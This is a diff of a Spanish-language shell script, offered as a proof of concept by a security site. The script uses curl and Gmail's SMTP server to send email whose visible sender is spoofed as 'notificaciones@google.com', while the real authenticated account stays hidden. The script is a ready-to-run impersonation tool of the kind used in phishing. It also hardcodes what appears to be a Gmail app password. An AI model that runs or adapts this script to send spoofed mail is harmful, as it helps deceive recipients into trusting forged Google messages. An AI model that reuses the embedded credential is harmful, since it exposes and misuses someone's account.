@@ -1,35 +1,27 @@
 #!/bin/sh
-##################################################
-# Prueba de concepto POC, envio bash shell gmail
+################################################################################
+# Prueba de concepto POC, envio con script bash shell gmail
 # Script en Bash Shell 1.0 usando curl con heredo
-# Suplanta email, Spoff en el display name a google.com , en el  nombre  a mistar
-# El smtp de gemail imprime y aparecera la cuenta realde origen a continuacion
+# Simula email, Spoff en el display name a google.com,  nombre a mostar
+# El SMTP de gmail imprime y aparecera la cuenta realde origen a continuacion
 # (R) hackingyseguridad.com 2026
 # @antonio_taboada
-################################################
-
-# Cuenta real autenticación SMP
+################################################################################
 
 real_sender="antonio.taboada@gmail.com"
-gapp="satk lnxi lpti vav"
+gapp="satk lnxi lpti vavv"
 
-# Cuenta suplantada que se muestra como remitente (spoofing)  
+# simula suplantar en display_name , nombre que se muestra como remitente
 display_name="notificaciones@google.com <notificaciones@google.com>"
-# Display-name , es aqui donde haceoms la simulacion  de otro origen
+# display_name , AQUI es donde ponemos cuenta de email que queremos que sea visible: el nombre a mostrar y la <direccion de email>
 
-sub="Asunto del email  "
+sub="Asunto del email. POC simula spoff email ...!!!  "
 
-# Cuenta de destino:
+# cuenta de email de destino:
 receiver="antonio.taboada@telefonica.net"
 
-body="prueba ed envio,
+body="prueba ed envio, esto es una prueba de concepto POC - mas informacion en: https://github.com/hackingyseguridad/email/"
 
-esto es una prueba de concepto POC - mas informacion en:
-https://github.com/hackingyseguridad/email/"
-
-# Enviando correo usando curl con heredoc
-# NOTA: --mail-from usa la cuenta real para autenticacion SMTP
-#       pero el encabezado "From:" muestra la cuenta falsificada
 response=$(curl -v --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
     --mail-from "$real_sender" \
     --mail-rcpt "$receiver" \
@@ -49,11 +41,12 @@ EOF
 
 if [ $? -eq 0 ]; then
     echo "enviado!"
-    echo "Remitente visible: $visible_sender"
+    echo "Remitente visible: $display_name"
     echo "Remitente real (SMTP): $real_sender"
 else
     echo "Error!"
     echo "Respuesta: $response"
 fi
+
 
 
